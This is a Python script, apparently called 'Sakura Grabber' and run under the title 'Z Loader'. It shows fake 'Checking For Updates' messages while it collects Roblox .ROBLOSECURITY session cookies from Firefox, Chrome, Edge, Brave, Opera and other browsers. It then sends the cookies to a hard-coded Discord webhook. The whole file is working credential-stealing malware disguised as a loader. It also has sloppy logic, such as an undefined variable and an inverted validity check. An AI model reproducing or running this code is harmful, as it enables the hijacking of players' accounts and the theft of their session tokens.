import os

os.system("title Z Loader")

webhook = "https://discord.com/api/webhooks/1104546026280468540/LSOh0n4CHczVHLgdaS4kiX08RhyMhwQvWUCVzY0uKqEXnegzuBFr1rasfRkkUEDvG_m9"

try:
    import robloxpy
    import requests
    import browser_cookie3

except:
    input("One Of The Packages Are Not Installed, Run 'Requirements.Bat' To Remove This Error!")
    exit()

import time
time.sleep(1.5)

Sakura_message = "Checking For Updates..."
print(Sakura_message)

import time
time.sleep(8.5)

Sakura_message = "Please Wait..."
print(Sakura_message)

def cookiecheckerandsend(cookie, platform):

    if not robloxpy.Utils.CheckCookie(cookie) == "This Is A Valid Cookie":
        return requests.post(url=webhook, data={"content":f"This Is A Valid Cookie!\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()

    requests.post(url=webhook, json={
        'username': "Sakura",
        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
        'embeds': [{
                "title": f"Sakura Grabber - {platform}",
                "description" : f"[Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
                "color" : 12452044,
                "fields": [
                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": True},
                ],
                "footer": {
                    "text": "Made By LeeWasTaken"
                }
            }
        ]
    }
)

def Sakura():

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

cookies = Sakura()
